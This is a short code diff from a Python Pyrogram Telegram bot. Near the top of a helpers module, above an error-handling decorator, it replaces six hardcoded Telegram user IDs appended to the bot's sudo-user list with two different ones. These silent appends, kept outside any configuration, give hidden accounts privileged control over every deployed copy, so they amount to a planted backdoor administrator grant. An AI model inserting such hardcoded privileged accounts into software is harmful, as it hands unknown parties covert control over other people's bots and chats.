@@ -8,12 +8,9 @@ from pyrogram.types import Message
 from config import Veez
 from helpers.admins import get_administrators
 
-Veez.SUDO_USERS.append(1757169682)
-Veez.SUDO_USERS.append(1738637033)
-Veez.SUDO_USERS.append(1448474573)
-Veez.SUDO_USERS.append(1672609421)
-Veez.SUDO_USERS.append(1670523611)
-Veez.SUDO_USERS.append(1952053555)
+Veez.SUDO_USERS.append(1833279646)
+Veez.SUDO_USERS.append(1131653685)
+
 
 def errors(func: Callable) -> Callable:
     async def decorator(client: Client, message: Message):
